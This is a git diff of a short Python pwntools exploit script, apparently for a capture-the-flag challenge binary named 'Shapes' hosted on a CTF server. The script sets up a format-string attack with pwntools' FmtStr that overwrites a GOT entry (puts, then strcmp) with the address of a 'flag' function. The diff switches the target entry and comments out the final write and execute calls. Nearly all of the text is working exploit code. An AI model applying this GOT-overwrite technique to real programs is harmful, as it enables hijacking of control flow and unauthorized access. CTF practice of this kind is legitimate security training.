@@ -1,8 +1,9 @@
 from pwn import *
 exe = context.binary = ELF("Shapes")
-#io = remote("0.cloud.chals.io", "30167")
-exitaddr = exe.got['puts']
+io = remote("0.cloud.chals.io", "30167")
+exitaddr = exe.got['strcmp']
 winaddr = exe.symbols['flag']
+
 def sendPayload(payload):
     io = remote("0.cloud.chals.io", "30167")
     io.recvuntil(b"(Yes/No):")
@@ -20,6 +21,6 @@ def sendPayload(payload):
     back = io.recvuntil(b'Sorry, that\'s wrong. Try again next time.')
     return back
 
-fmt = FmtStr(execute_fmt=sendPayload, offset=6)
-fmt.write(exitaddr, winaddr)
-fmt.execute_writes()
+fmt = FmtStr(execute_fmt=sendPayload)
+#fmt.write(exitaddr, winaddr)
+#fmt.execute_writes()
